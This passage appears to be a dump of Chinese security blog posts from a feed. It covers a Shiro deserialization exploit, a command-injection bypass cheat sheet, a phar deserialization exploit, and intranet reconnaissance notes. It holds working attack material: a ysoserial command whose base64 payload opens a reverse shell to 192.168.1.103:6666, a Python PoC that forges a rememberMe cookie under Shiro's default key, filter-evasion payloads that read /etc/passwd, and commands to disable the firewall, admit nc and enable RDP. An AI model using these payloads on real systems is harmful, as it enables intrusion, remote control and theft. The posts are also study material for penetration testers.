<p>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAzLzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}”</p>
<p>接下来就是端口监测，poc.py代码如下</p>
<p>－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－</p>
<p>import sys</p>
<p>import uuid</p>
<p>import base64</p>
<p>import subprocess</p>
<p>from Crypto.Cipher import AES</p>
<p>def encode_rememberme(command):</p>
<p>  popen = subprocess.Popen([‘java’, ‘-jar’, ‘ysoserial-master-30099844c6-1.jar’, ‘JRMPClient’, command], stdout=subprocess.PIPE)</p>
<p>  BS = AES.block_size</p>
<p>  pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</p>
<p>  key = base64.b64decode(“kPH+bIxk5D2deZiIxcaaaA==”)</p>
<p>  iv = uuid.uuid4().bytes</p>
<p>  encryptor = AES.new(key, AES.MODE_CBC, iv)</p>
<p>  file_body = pad(popen.stdout.read())</p>
<p>  base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</p>
<p>  return base64_ciphertext</p>
<p>if <strong>name</strong> == ‘<strong>main</strong>‘:</p>
<p>  payload = encode_rememberme(sys.argv[1])</p>
<p>print “rememberMe={0}”.format(payload.decode())</p>
<p>－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－</p>
<p>python poc.py 监听服务器ip:端口</p>
<p>生成了payload</p>
<p>向服务器发送payload的cookie</p>
<p>成功获取到shell。</p>
<iframe src="//player.bilibili.com/player.html?aid=711730464&bvid=BV1tD4y127U7&cid=224472912&page=16" width="600" height="700" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行绕过</title>
    <url>/2020/08/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p><strong>keyword：我只是互联网的搬运工</strong></p>
<p><strong>转载：<a href="https://mp.weixin.qq.com/s?__biz=MzIyMjkzMzY4Ng==&amp;mid=2247484463&amp;idx=1&amp;sn=2f9aaaec02859a920fac483bc8c8c146&amp;chksm=e824a3f6df532ae0fcdb41c95221468e0fca07d7bbcf4c1723fd34f2dba725d9e52180ce3cf6&amp;mpshare=1&amp;scene=24&amp;srcid=0717WOvidxHw0avSAD5yV7bE&amp;sharer_sharetime=1594999264244&amp;sharer_shareid=9cfbb554b3422268f4530d007f9754e4#rd">https://mp.weixin.qq.com/s?__biz=MzIyMjkzMzY4Ng==&amp;mid=2247484463&amp;idx=1&amp;sn=2f9aaaec02859a920fac483bc8c8c146&amp;chksm=e824a3f6df532ae0fcdb41c95221468e0fca07d7bbcf4c1723fd34f2dba725d9e52180ce3cf6&amp;mpshare=1&amp;scene=24&amp;srcid=0717WOvidxHw0avSAD5yV7bE&amp;sharer_sharetime=1594999264244&amp;sharer_shareid=9cfbb554b3422268f4530d007f9754e4#rd</a></strong></p>
<h1 id="Linux篇"><a href="#Linux篇" class="headerlink" title="Linux篇"></a>Linux篇</h1><h3 id="命令拼接"><a href="#命令拼接" class="headerlink" title="命令拼接"></a>命令拼接</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=who</span><br><span class="line">b=ami</span><br><span class="line">$a$b //输出whoami</span><br></pre></td></tr></table></figure>



<h3 id="常用字符使用"><a href="#常用字符使用" class="headerlink" title="常用字符使用"></a>常用字符使用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;            表示将任务置于后台执行</span><br><span class="line">;            多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块</span><br><span class="line">&amp;&amp;           只有在 &amp;&amp; 左边的命令返回真(命令返回值 $? == 0),&amp;&amp;右边的命令才会被执行。</span><br><span class="line">||           只有在 || 左边的命令返回假(命令返回值 $? == 1),||右边的命令才会被执行。</span><br><span class="line">%0a</span><br><span class="line">%0d</span><br><span class="line">| (管道符)     |表示管道，上一条命令的输出，作为下一条命令的参数</span><br></pre></td></tr></table></figure>

<p>例:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo qwe ; ls 				//会先输出字符qwe,然后执行ls</span><br><span class="line">q=l; w=s; e=&quot; -al&quot;; $q$w$e 	//执行ls -al命令</span><br><span class="line">qwe | ls 					//执行后面的命令,前面的不执行</span><br></pre></td></tr></table></figure>

<p>这些都可以自己去试试…这些字符最多用到的就是<code>;</code>和<code>|</code>就先只说最常用的了…</p>
<span id="more"></span> 

<h3 id="利用Linux的环境变量"><a href="#利用Linux的环境变量" class="headerlink" title="利用Linux的环境变量"></a>利用Linux的环境变量</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $&#123;PATH&#125;	///usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"></span><br><span class="line">echo $&#123;PATH:1:9&#125;//usr/local</span><br></pre></td></tr></table></figure>

<p>可以通过截断和拼接来得到我们想要的来getshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PATH:5:1&#125;	//l</span><br><span class="line">$&#123;PATH:2:1&#125;	//s</span><br><span class="line">$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;	//拼接后是ls,执行命令</span><br><span class="line">$&#123;PATH:5:1&#125;s			//拼接后是ls,执行命令</span><br></pre></td></tr></table></figure>



<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$IFS$1</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&lt;     比如cat&lt;a.tct:表示cat a.txt</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>



<h3 id="绕过关键字"><a href="#绕过关键字" class="headerlink" title="绕过关键字"></a>绕过关键字</h3><p>基础常见版本:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wh\o\ami	//反斜线绕过</span><br><span class="line">who&quot;a&quot;mi	//双引号绕过</span><br><span class="line">whoa&#x27;m&#x27;i	//单引号绕过</span><br><span class="line">whoam``i	//反引号绕过</span><br><span class="line">echo d2hvYW1p|base64 -d|sh	//base64绕过,其中d2hvYW1p是whoami的base64编码</span><br><span class="line">echo d2hvYW1p|base64 -d|bash//base64绕过,其中d2hvYW1p是whoami的base64编码</span><br><span class="line">`echo d2hvYW1p|base64 -d` //将其base64解码,然后用反引号来执行命令</span><br><span class="line">echo 77686F616D69 | xxd -r -p | bash //hex绕过,其中77686F616D69是whoami的hex编码</span><br><span class="line"></span><br><span class="line">//$*和$@，$x(x 代表 1-9),$&#123;x&#125;(x&gt;=10) :比如ca$&#123;21&#125;t a.txt表示cat a.txt    在没有传入参数的情况下,这些特殊字符默认为空,如下:</span><br><span class="line">wh$1oami</span><br><span class="line">who$@ami</span><br><span class="line">whoa$*mi</span><br></pre></td></tr></table></figure>

<p>进阶深入:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">666`whoami`666		//bash: 666root666: command not found</span><br><span class="line">666`\whoami`666		//bash: 666root666: command not found</span><br><span class="line">//命令执行后的结果在2个666中间</span><br></pre></td></tr></table></figure>

<p>所以更进一步:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">w`f1hgb`ho`f1hgb`am`f1hgb`i		//反引号的作用是把括起来的字符当做命令执行</span><br><span class="line">w`\f1hgb`ho`\f1hgb`am`\f1hgb`i	//这个反斜线作用就是平时的那种连接,反引号的作用是把括起来的字符当做命令执行</span><br><span class="line">wh$(f1hgb)oa$(f1hgb)mi			//和上面的差不多,都说执行和拼接</span><br></pre></td></tr></table></figure>

<p>既可以绕过命令,又可以绕过文件名的,下述的则是只能用来绕过文件名的:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat fl[abc]g.php								 //匹配[abc]中的任何一个</span><br><span class="line">cat f[a-z]ag.txt								 //匹配a-z范围的任何字符</span><br><span class="line">cat fla*										 //用*匹配任意</span><br><span class="line">a=f;d=ag;c=l;cat $a$c$d.php 表示cat flag.php		//内联执行</span><br></pre></td></tr></table></figure>

<p>下述的则是文件名绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用正则:比如要读取etc/passwd</span><br><span class="line">cat /???/??????</span><br><span class="line">cat /???/pass*</span><br><span class="line">cat /etc$u/passwd</span><br></pre></td></tr></table></figure>



<h3 id="命令执行函数绕过"><a href="#命令执行函数绕过" class="headerlink" title="命令执行函数绕过"></a>命令执行函数绕过</h3><p>这里只举例<code>system</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&quot;cat /etc/passwd&quot;)</span><br><span class="line">&lt;=&gt;</span><br><span class="line">&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;cat /etc/passwd&quot;);</span><br><span class="line">&lt;=&gt;</span><br><span class="line">(sy.(st).em)(&quot;cat /etc/passwd&quot;);</span><br><span class="line">&lt;=&gt;还可以用注释方法绕过</span><br><span class="line">&quot;system/*fthgb666*/(&quot;cat /etc/passwd);&quot;</span><br><span class="line">&lt;=&gt;</span><br><span class="line">&quot;system/*fthgb666*/(wh./*fthgb666*/(oa)/*fthgb666*/.mi);&quot;</span><br><span class="line">&lt;=&gt;</span><br><span class="line">&quot;(sy./*fthgb666*/(st)/*fthgb666*/.em)/*fthgb666*/(wh./*fthgb666*/(oa)/*fthgb666*/.mi);&quot;</span><br></pre></td></tr></table></figure>



<h1 id="windows篇"><a href="#windows篇" class="headerlink" title="windows篇"></a>windows篇</h1><h3 id="符号与命令"><a href="#符号与命令" class="headerlink" title="符号与命令"></a>符号与命令</h3><ul>
<li><p><code>whoami</code> //正常执行</p>
</li>
<li><p><code>w&quot;h&quot;o&quot;a&quot;m&quot;i</code> 或<code>&quot;w&quot;h&quot;o&quot;a&quot;m&quot;i&quot;</code>或<code>&quot;w&quot;h&quot;o&quot;a&quot;m&quot;i</code>或<code>w&quot;h&quot;o&quot;a&quot;m&quot;i&quot;</code>//正常执行</p>
</li>
<li><p><code>who^ami</code>或<code>wh&quot;&quot;o^a^mi</code> 或<code>wh&quot;&quot;o^a^mi&quot;</code>//正常执行</p>
</li>
<li><ul>
<li>但是<code>&quot;wh&quot;&quot;o^a^mi&quot;</code>这种在开头就有单引号的情况是不能执行的</li>
</ul>
</li>
<li><p><code>(Whoami)</code>或<code>(Wh^o^am&quot;&quot;i)</code>或<code>((((Wh^o^am&quot;&quot;i))))</code> //正常执行</p>
<p>注:可以加无数个<code>&quot;</code>但不能同时连续加2个<code>^</code>符号，因为^号是cmd中的转义符，跟在他后面的符号会被转义</p>
</li>
</ul>
<h3 id="set命令"><a href="#set命令" class="headerlink" title="set命令"></a>set命令</h3><p>知识点:用两个%括起来的变量,会输出变量的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set a=1 //设置变量a，值为1</span><br><span class="line">echo a //此时输出结果为&quot;a&quot;</span><br><span class="line">echo %a% //此时输出结果为&quot;1&quot;</span><br></pre></td></tr></table></figure>

<p>接下来的进阶利用就是:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set a=who</span><br><span class="line">set b=ami</span><br><span class="line">%a%%b% //正常执行whoami</span><br><span class="line">call %a%%b% //正常执行whoami</span><br></pre></td></tr></table></figure>

<p>所以,上述的符号与命令部分的所有操作,都可以通过<code>set</code>来实现,只需要慢慢拼接就ok</p>
<h3 id="切割字符"><a href="#切割字符" class="headerlink" title="切割字符"></a>切割字符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set a=whoami</span><br><span class="line">%a:~0% //取出所有字符,所以正常执行命令</span><br><span class="line">%a:~0,6% //从开始切割6个字符,刚好是whoami,所以正常执行</span><br><span class="line">%a:~0,5% //切割后是whoam,不是系统命令,不能执行</span><br></pre></td></tr></table></figure>



<p>注:上述可以使用减号,和python的切割效果差不多</p>
<p>所以,可以考虑的东西就来了:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set a=abc qwe //先自定义</span><br><span class="line">wh^o^%a:~0,1%mi //然后截断整理后就变成了:wh^o^ami,所以命令执行成功</span><br></pre></td></tr></table></figure>

<p>所以,这样写webshell什么的也就很简单了</p>
<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><ul>
<li><code>|</code>:可以连接命令,但只会执行后面的那条</li>
<li><code>||</code>:只有前面的命令失败,才会执行后面的语句</li>
<li><code>&amp;</code>:前面的命令可以成功也可以失败,都会执行后面的命令</li>
<li><code>&amp;&amp;</code>:必须两条命令都为真才可以全部执行。如果第一条语句错误,整个命令都不执行。如果第一条语句对,第二条错误,就只执行第一条</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami | ping www.baidu.com</span><br><span class="line">whoami || ping www.baidu.com</span><br><span class="line">qwe &amp; ping www.baidu.com</span><br><span class="line">qwe &amp;&amp; ping www.baidu.com</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
        <category>奇淫技巧</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>姿势学习</tag>
      </tags>
  </entry>
  <entry>
    <title>关于phar反序列化漏洞挖掘</title>
    <url>/2020/07/31/%E5%85%B3%E4%BA%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>说到PHP反序列化，大概就是围绕serialize()，unserialize()这两个函数</p>
<p>序列化说通俗点就是把一个对象变成可以传输的字符串</p>
<p>那反序列化不就是颠转过来吗</p>
<h4 id="反序列化漏洞造成原因"><a href="#反序列化漏洞造成原因" class="headerlink" title="反序列化漏洞造成原因"></a>反序列化漏洞造成原因</h4><p>服务器能够接收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进这些魔术方法里面的话，就容易造成很严重的漏洞了</p>
<h3 id="phar反序列化漏洞"><a href="#phar反序列化漏洞" class="headerlink" title="phar反序列化漏洞"></a>phar反序列化漏洞</h3><p>phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作</p>
<h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><p>简单来说<code>phar</code>就是<code>php</code>压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与<code>file://</code> <code>php://</code>等类似，也是一种流包装器。</p>
<p><code>phar</code>结构由 4 部分组成</p>
<ul>
<li><code>stub</code> phar 文件标识，格式为 <code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;；</code></li>
<li><code>manifest</code> 压缩文件的属性等信息，以<strong>序列化</strong>存储，是主要的攻击点。</li>
<li><code>contents</code> 压缩文件的内容；</li>
<li><code>signature</code> 签名，放在文件末尾；</li>
</ul>
<p>这里有两个关键点，一是文件标识，必须以<code>__HALT_COMPILER();?&gt;</code>结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者<code>pdf</code>文件来绕过一些上传限制；二是反序列化，<code>phar</code>存储的<code>meta-data</code>信息以序列化方式存储，当文件操作函数通过<code>phar://</code>伪协议解析<code>phar</code>文件时就会将数据反序列化，而这样的文件操作函数有很多。</p>
<table>
<thead>
<tr>
<th>受影响函数列表</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>fileatime</td>
<td>filectime</td>
<td>file_exists</td>
<td>file_get_contents</td>
</tr>
<tr>
<td>file_put_contents</td>
<td>file</td>
<td>filegroup</td>
<td>fopen</td>
</tr>
<tr>
<td>fileinode</td>
<td>filemtime</td>
<td>fileowner</td>
<td>fileperms</td>
</tr>
<tr>
<td>is_dir</td>
<td>is_executable</td>
<td>is_file</td>
<td>is_link</td>
</tr>
<tr>
<td>is_readable</td>
<td>is_writable</td>
<td>is_writeable</td>
<td>parse_ini_file</td>
</tr>
<tr>
<td>copy</td>
<td>unlink</td>
<td>stat</td>
<td>readfile</td>
</tr>
</tbody></table>
<h4 id="造成原因"><a href="#造成原因" class="headerlink" title="造成原因"></a>造成原因</h4><p>phar反序列化可以不用unserialize函数的可控，只需要满足上面的危险函数可控，就可以造成反序列化的攻击，大大增加了反序列化漏洞的挖掘。这里，利用以下代码生成phar文件</p>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> class A&#123;</span><br><span class="line">   public $name;</span><br><span class="line">   public function __construct()&#123;</span><br><span class="line">     echo &quot;对象创建调用&lt;br&gt;&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">   public function __destruct()&#123;</span><br><span class="line">     eval($this-&gt;name);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($_GET[&#x27;file&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>发现函数file_exists,存在危险函数可控</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">     class A &#123;</span><br><span class="line">         public function __construct()&#123;</span><br><span class="line">            $this-&gt;name = &#x27;phpinfo();&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     @unlink(&quot;phar.phar&quot;);</span><br><span class="line">     $phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $o = new A();</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>phar文件是通过stub来标识的，是通过xxx<?php xxx.__HALT_COMPILER(); ?>来判断的，所以对后缀并没有要求，修改成gif，通过图片的上传点，上传到目标服务器，在利用phar://协议执行pahr文件。</p>
<h3 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h3><p>在php.ini中需要设置phar.readonly为off，不是无法生成phar文件</p>
<p><code>phar.readonly = off</code></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>域名信息搜集</title>
    <url>/2020/07/24/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<p><strong>keyword：我只是互联网的搬运工</strong></p>
<p>PS：这篇文章很长！是前辈ms08067团队出的书《内网安全攻防》里的内容（很不错），我都一一复现了一遍并做了笔记，请耐心观看。以后会有第三章，第四章…的笔记，佛系更新吧~</p>
<p>2.1 内网信息搜集概述<br>当渗透测试人员进入内网后，面对的是一片“黑暗森林”，所以渗透测试人员首先会对当前所处的网络环境进行判断，通常的判断分为三种。</p>
<p>我是谁？——对机器角色的判断。</p>
<p>这是哪？——对目前机器所处网络环境的拓扑结构进行分析和判断。</p>
<p>我在哪？——对目前机器所处位置区域的判断。</p>
<p>2.2 搜集本机信息<br>1：查询网络配置信息<br>获取本机网络配置信息：</p>
<p>ipconfig /all</p>
<span id="more"></span> 


<p>2：查询操作系统及软件的信息<br>（1）查询操作系统和版本信息</p>
<p>英文版系统用这条命令：<br>systeminfo | findstr /B /C:”OS Nmae” /C:”OS Version”</p>
<p>中文版系统用这条命令：<br>systeminfo | findstr /B /C:”OS 名称” /C:”OS 版本”<br>（2）查看系统体系结构</p>
<p>echo %PROCESSOR_ARCHITECTURE%</p>
<p>（3）查看安装的软件及版本、路径等</p>
<p>wmic product get name,version</p>
<p>（4）使用powershell命令，搜集软件的版本信息</p>
<p>powershell “Get-WmiObject -class Win32_Product |Select-Object -Property name,version”</p>
<p>3：查询本机服务信息</p>
<p>wmic service list brief</p>
<p>4：查询进程列表<br>查看当前进程列表和进程用户、分析软件、邮件客户端、vpn和杀毒软件等进程</p>
<p>tasklist</p>
<p>wmic process list brief</p>
<p>5：查看启动程序信息</p>
<p>wmic startup get command,caption</p>
<p>6：查看计划任务</p>
<p>schtasks /query /fo LIST /v</p>
<p>7：查看主机开机时间</p>
<p>net statistics workstation</p>
<p>8：查询用户列表<br>（1）查看有那些用户</p>
<p>net user</p>
<p>（2）获取本地管理员、包含域用户信息</p>
<p>net localgroup administrators</p>
<p>（3）查看当前在线用户</p>
<p>query user || qwinsta</p>
<p>（4）列出或断开本地计算机与所连接的客户端之间的会话</p>
<p>net session<br>（5）查询端口列表</p>
<p>netstat -ano</p>
<p>（6）查询补丁信息</p>
<p>systeminfo</p>
<p>wmic qfe get Caption,Description,HotFixID,InstalledOn</p>
<p>（7）查询本机共享列表</p>
<p>net share</p>
<p>wmic share get name,path,status</p>
<p>9：查询路由表及所有可用接口的ARP缓冲表</p>
<p>route print<br>arp -a</p>
<p>10：查询防火墙相关配置<br>（1）关闭防火墙</p>
<p>win 2003及之前的版本用这条命令：<br>netsh firewall set opmode disable</p>
<p>win 2003之后的版本用这条命令：<br>netsh advfirewall set allprofiles state off<br>（2）查看防火墙配置</p>
<p>netsh firewall show config</p>
<p>（3）修改防火墙配置</p>
<p>win 2003及之前的版本，运行指定程序全部连接：<br>netsh firewall add allowedprogram c:\nc.exe “allow nc” enable</p>
<p>win 2003之后的版本用这条：<br>netsh advfirewall firewall add rule name=”pass nc” dir=in action=allow program=”C:\nc.exe”</p>
<p>允许指定程序连出，命令如下<br>netsh advfirewall firewall add rule name=”Allow nc” dir=out action=allow program=”C: \nc.exe”</p>
<p>允许 3389 端口放行，命令如下<br>netsh advfirewall firewall add rule name=”Remote Desktop” protocol=TCP dir=in localport=3389 action=allow</p>
<p>自定义防火墙日志储存位置<br>netsh advfirewall set currentprofile logging filename “C:\windows\temp\fw.log”<br>11：查看代理配置情况</p>
<p>reg query “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings”</p>
<p>12：查询并开启远程连接服务<br>（1）查看远程连接端口<br>在 cmd 下使用注册表查询语句，命令如下，得到连接端口为 0xd3d，转换后为 3389</p>
<p>REG QUERY “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /V PortNumber</p>
<p>（2）在 Windows Server 2003 中开启 3389 端口</p>
<p>wmic path win32_terminalservicesetting where (__CLASS !=””)  call setallowtsconnections 1<br>（3）在Windows Server 2008和Windows Server 2012中开启3389端口</p>
<p>wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=””) call setallowtsconnections 1</p>
<p>wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=’RDP-Tcp’) call setuserauthenticationrequired 1</p>
<p>reg add “HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f<br>2.2 自动收集信息<br>使用WMIC自动脚本来收集信息,打开运行 wmic_info.bat 会自动生成一个 out.html 文件</p>
<p>Empire下的主机信息搜集<br>Empirer提供了收集主机的模块。</p>
<p>下载地址：<a href="https://github.com/EmpireProject/Empire.git">https://github.com/EmpireProject/Empire.git</a></p>
<p>2.3 查询当前权限<br>1、查看当前权限</p>
<p>whoami<br>本地管理员用户，或者是本地用户：</p>
<p>域内用户：</p>
<p>在以上三种情况下，如果当前内网中存在域，那么本地普通用户只能查询本机相关信息，不能查询域内信息；而本地管理员用户和域内用户可以查询域内信息。其原理是：域内的所有查询都是通过域控制器实现的（基于LDAP协议），而这个查询需要经过权限认证，所以只有域用户才拥有这个权限；当域用户执行查询命令时，会自动使用kerberos协议进行认证，无须额外输入账号密码。</p>
<p>2、获取域SID</p>
<p>whoami /all</p>
<p>当前域 hacker 的 SID 为：</p>
<p>3、查询指定用户的详细信息</p>
<p>net user 用户名 /domain</p>
<p>2.4 判断是否存在域<br>1、使用ipconfig命令</p>
<p>ipconfig /all</p>
<p>然后可以使用反向解析查询命令 nslookup 来解析域名的IP地址。用解析到的IP地址进行对比，判断域控制器和DNS服务器是否在同一台服务器上：</p>
<p>nclookup hacker.lab</p>
<p>2、查看系统详细配置<br>使用 systeminfo 命令，如果存在域就会显示：</p>
<p>如果不存在就会显示一个：WORKGROUP</p>
<p>3、查询当前登录域及登录用户信息<br>执行命令如果存在域那么就会显示工作站域和工作站域DNS等信息：</p>
<p>net config workstation</p>
<p>执行命令如果不存在域那么就会显示WORKGROUP：</p>
<p>4、判断主域<br>判断主域：域服务器通常会同时作为时间服务器使用</p>
<p>net time /domain<br>有三种情况，第一种中存在域，当前是域用户：</p>
<p>第二种是，不存在域，环境是工作组：</p>
<p>第三种是，存在域，但是当前用户不是域用户</p>
<p>2.5 探测域内存活主机<br>1、使用nbtscan<br>nbtscan是一个命令行工具，用于扫描本地或远程TCP/IP网络上开放的NetBIOS名称服务器。</p>
<p>NetBOIS是局域网程序使用的一种程序编程接口（API），为程序提供了请求低级别服务的统一命令集，为局域网提供了网络及其他特殊功能。几乎所有局域网都是在NetBIOS协议的基础上工作的。NetBIOS也是计算机的标识名，主要用于局域网中计算机的互访问。NetBIOS的工作流程就是正常的机器名解析查询应答过程，因此推荐优先使用。</p>
<p>使用命令格式：</p>
<p>nbtscan.exe 10.10.10.0/20</p>
<p>第一列为IP地址，第二列为机器名和所在域的名称，第三列是机器所开启的服务列表。</p>
<p>服务列表具体含义：</p>
<p>Token：            含义：<br>SHARING             该机器中存在运行的文件和打印共享服务，但不一定有内容共享<br>DC                 该机器可能是域控制器<br>U=USER             该机器中有登陆名为User的用户（不太准确）<br>IIS                 该机器中可能安装了IIS服务<br>EXCHANGE         该机器中可能安装了Exchane<br>NOTES             该机器中可能安装了Lotus Notes电子邮箱客户端<br>？                 没有识别出机器的NetBIOS资源（可以使用 -F 选项再次扫描）</p>
<p>2、利用ICMP协议快速探测内网<br>除了使用NetBIOS探测内网，还可以使用ICMP协议去探测内网情况。</p>
<p>使用ping命令，依次对内网中的每个IP地址执行Ping命令，可以快速找出内网中所有存活的主机（比较慢）：</p>
<p>for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr “TTL=”</p>
<p>还可以使用VBS脚本进行探测，脚本源代码如下：</p>
<p>strSubNet = “10.10.10.”<br>Set objFSO= CreateObject(“Scripting.FileSystemObject”)<br>Set objTS = objfso.CreateTextFile(“C:\Windows\Temp\Result.txt”)<br>For i = 1 To 254<br>strComputer = strSubNet &amp; i<br>blnResult = Ping(strComputer)<br>If blnResult = True Then<br>objTS.WriteLine strComputer &amp; “ is alived ! :) “<br>End If<br>Next<br>objTS.Close<br>WScript.Echo “All Ping Scan , All Done ! :) “<br>Function Ping(strComputer)<br>Set objWMIService = GetObject(“winmgmts:\.\root\cimv2”)<br>Set colItems = objWMIService.ExecQuery(“Select * From Win32_PingStatus Where Address=’” &amp; strComputer &amp; “‘“)<br>For Each objItem In colItems<br>Select case objItem.StatusCode<br>Case 0<br>Ping = True<br>Case Else<br>Ping = False<br>End select<br>Exit For<br>Next<br>End Function<br>运行命令：cscript 1.vbs（速度很慢）</p>
<p>运行完后它会把结果保存到C:\Windows\Temp\Result.txt 中：</p>
